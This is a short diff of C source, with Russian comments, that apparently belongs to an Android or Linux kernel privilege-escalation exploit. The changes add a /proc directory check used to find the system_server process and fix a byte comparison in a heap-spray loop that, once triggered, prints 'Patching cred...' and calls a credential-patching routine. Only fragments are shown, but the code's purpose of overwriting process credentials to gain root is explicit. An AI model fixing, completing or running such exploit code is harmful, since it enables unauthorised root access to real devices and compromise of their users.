@@ -2100,6 +2100,11 @@ system("sync && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null");
 sleep(1);
 
 // Находим PID system_server
+DIR *dir = opendir("/proc");
+if (!dir) {
+    perror("opendir /proc");
+    exit(1);
+}
 struct dirent *entry;
 pid_t system_server_pid = 0;
 
@@ -2434,7 +2439,7 @@ restart:;
 
             while (1)
             {
-                if (spray_ctrl[idx].do_action == 1 && gbuf[0] == 0xab)
+                if (spray_ctrl[idx].do_action == 1 && (unsigned char)gbuf[0] == 0xab)
                 {
                     fprintf(stderr, "[SPRAY %d] Triggered! Patching cred...\n", i);
                     safe_cred_patch();
